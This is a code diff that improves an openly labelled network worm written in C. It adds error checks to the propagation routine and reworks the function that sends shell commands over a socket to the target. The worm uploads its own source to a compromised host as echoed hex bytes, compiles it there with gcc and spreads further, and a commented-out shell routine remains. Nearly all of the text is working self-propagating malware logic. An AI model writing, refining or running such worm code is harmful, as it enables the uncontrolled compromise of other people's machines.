@@ -23,7 +23,7 @@ int shell(int fd);
 
 int main(int argc, char *argv[]) {
     char *hostname;
-    int fd;
+    int fd, ret;
 
     if (argc < 2) {
         fprintf(stderr, "Usage:\n\n\t%s TARGET_IP\n\n", argv[0]);
@@ -39,7 +39,11 @@ int main(int argc, char *argv[]) {
     }
 
     printf("# Propagating worm...\n");
-    propagate(fd);
+    ret = propagate(fd);
+    if (ret < 0) {
+        fprintf(stderr, "Falha ao propagar o worm.\n");
+        exit(EXIT_FAILURE);
+    }
 
     // ret = shell(fd);
     // if (ret < 0) {
@@ -100,7 +104,7 @@ int propagate(int fd) {
     }
 
     printf("# Compiling...\n");
-    if (command(fd, "gcc -o /tmp/worm /tmp/src/main.c /tmp/src/exploit.c > /tmp/build.log 2>&1") < 0) {
+    if (command(fd, "gcc -o /tmp/worm /tmp/src/main.c /tmp/src/exploit.c") < 0) {
         return -1;
     }
 
@@ -143,7 +147,7 @@ int upload_file(int fd, const char *filename, const char *dest) {
         }
 
         // execute a command to echo the hexadecimal bytes to the dest file
-        if (command(fd, "echo -n -e '%s' >> %s", hex_string, dest) < 0) {
+        if (command(fd, "(echo -n -e '%s' >> %s)", hex_string, dest) < 0) {
             free(file_buf);
             fclose(file);
             return -1;
@@ -163,11 +167,16 @@ int command(int fd, const char *str, ...) {
     vsnprintf(buf, sizeof(buf), str, vl);
     va_end(vl);
 
-    strcat(buf, "; echo\n");
+    strcat(buf, " >>/tmp/log 2>&1 && echo ok || echo fail\n");
     write(fd, buf, strlen(buf));
     read(fd, buf, sizeof(buf));
 
-    return 0;
+    if (strncmp("ok", buf, 2) == 0) {
+        return 0;
+    }
+    else {
+        return -1;
+    }
 }
 
 int shell(int fd) {
